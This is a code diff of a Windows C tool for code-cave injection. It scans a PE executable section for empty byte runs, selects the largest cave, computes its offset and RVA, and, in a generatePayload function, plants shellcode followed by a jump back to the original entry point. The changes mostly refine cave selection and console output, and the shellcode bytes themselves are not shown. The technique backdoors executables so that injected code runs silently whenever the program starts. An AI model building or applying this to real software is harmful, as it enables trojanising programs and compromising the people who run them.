@@ -1,6 +1,8 @@
 #include <stdio.h>
 #include <Windows.h>
 
+#define DEBUG 1
+
 typedef struct _CAVE_INFO
 {
 	PBYTE pStartAddress;
@@ -51,9 +53,10 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_I
 					pEndAddress,
 					caveSize
 				};
-				printf("CAVE Start: %p\n", cave.pStartAddress);
-				printf("CAVE End: %p\n", cave.pEndAddress);
-				printf("CAVE Size: %d\n", cave.dwSize);
+				printf("\033[0;32m[+] Discovered cave!\033[0m\n");
+				printf("-> CAVE Start: %p\n", cave.pStartAddress);
+				printf("-> CAVE End: %p\n", cave.pEndAddress);
+				printf("-> CAVE Size: %d\n", cave.dwSize);
 				caveInfoArray[caveIndex] = cave;
 				caveIndex++;
 			}
@@ -62,34 +65,43 @@ int enumerateSection(PIMAGE_SECTION_HEADER pSectionHeader, PBYTE pBuffer, CAVE_I
 			pEndAddress = NULL;
 			caveSize = 0;
 		}
-		/*if ((i + 1) % 16 == 0)
-		{
-			printf("\n");
-		}
-		*/
 	}
 
 	printf("\033[0;32m[+] Found %d cave(s) in the section.\033[0m\n", caveIndex);
+	printf("[+] Using largest cave\n");
+	int largestCaveIndex = 0;
+	DWORD largestCaveSize = 0;
 	for (int i = 0; i < caveIndex; i++)
 	{
-		printf("Cave [%d]:\n", i);
-		DWORD caveSectionOffset = (DWORD)(caveInfoArray[i].pStartAddress - pSectionStart);
-		DWORD oldrva = pSectionHeader->VirtualAddress + caveSectionOffset;
-		DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
-		DWORD rva = pSectionHeader->VirtualAddress + (caveFileOffset - pSectionHeader->PointerToRawData);
+		if (largestCaveSize == 0)
+		{
+			largestCaveSize = caveInfoArray[i].dwSize;
+			largestCaveIndex = i;
+			continue;
+		}
 
-		caveInfo->pStartAddress = caveInfoArray[i].pStartAddress;
-		caveInfo->pEndAddress = caveInfoArray[i].pEndAddress;
-		caveInfo->dwSize = caveInfoArray[i].dwSize;
-		caveInfo->offset = caveFileOffset;
-		caveInfo->rva = rva;
-		printf("  Start Address: 0x%p\n", caveInfo->pStartAddress);
-		printf("  End Address: 0x%p\n", caveInfo->pEndAddress);
-		printf("  Size: %d bytes\n", caveInfo->dwSize);
-		printf("  Offset: 0x%04X\n", caveInfo->offset);
-		printf("  RVA: 0x%04X\n", caveInfo->rva);
-		printf("  Old RVA: 0x%04X\n", oldrva);
+		if (caveInfoArray[i].dwSize > largestCaveSize)
+		{
+			largestCaveSize = caveInfoArray[i].dwSize;
+			largestCaveIndex = i;
+		}
 	}
+
+	DWORD caveSectionOffset = (DWORD)(caveInfoArray[largestCaveIndex].pStartAddress - pSectionStart);
+	//DWORD oldrva = pSectionHeader->VirtualAddress + caveSectionOffset;
+	DWORD caveFileOffset = pSectionHeader->PointerToRawData + caveSectionOffset;
+	DWORD rva = pSectionHeader->VirtualAddress + (caveFileOffset - pSectionHeader->PointerToRawData);
+
+	caveInfo->pStartAddress = caveInfoArray[largestCaveIndex].pStartAddress;
+	caveInfo->pEndAddress = caveInfoArray[largestCaveIndex].pEndAddress;
+	caveInfo->dwSize = caveInfoArray[largestCaveIndex].dwSize;
+	caveInfo->offset = caveFileOffset;
+	caveInfo->rva = rva;
+	printf("-> Start Address: 0x%p\n", caveInfo->pStartAddress);
+	printf("-> End Address: 0x%p\n", caveInfo->pEndAddress);
+	printf("-> Size: %d bytes\n", caveInfo->dwSize);
+	printf("-> Offset: 0x%04X\n", caveInfo->offset);
+	printf("-> RVA: 0x%04X\n", caveInfo->rva);
 
 	return 0;
 }
@@ -157,9 +169,6 @@ BOOL generatePayload(DWORD originalEntryPoint, PCAVE_INFO pCaveInfo, PBYTE pCave
 
 	pCaveAddress[scSize] = 0xE9; // jmp
 	*(LONG*)(pCaveAddress + scSize + 1) = rel32;
-
-	printf("[DBG] pCaveInfo->rva           : 0x%08X\n", pCaveInfo->rva);
-	printf("[DBG] pCaveInfo->offset        : 0x%08X\n", pCaveInfo->offset);
 
 	return TRUE;
 }
